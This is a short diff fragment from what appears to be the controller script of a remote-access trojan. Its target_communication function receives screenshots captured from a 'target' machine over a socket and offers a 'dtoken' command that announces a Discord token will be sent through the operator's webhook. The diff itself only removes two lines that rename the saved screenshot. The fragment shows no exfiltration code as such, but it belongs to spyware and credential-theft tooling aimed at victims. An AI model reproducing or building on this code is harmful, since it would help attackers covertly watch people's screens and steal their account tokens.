@@ -67,8 +67,6 @@ def target_communication():
                     break
             target.settimeout(None)
             f.close()
-            os.rename('screenshot0', 'screenshot.jpg')
-            print("screenshot saved as screenshot.jpg")
             count += 1
 	elif command[:6] == "dtoken":
 		print("token will be sent through your discord webhook")
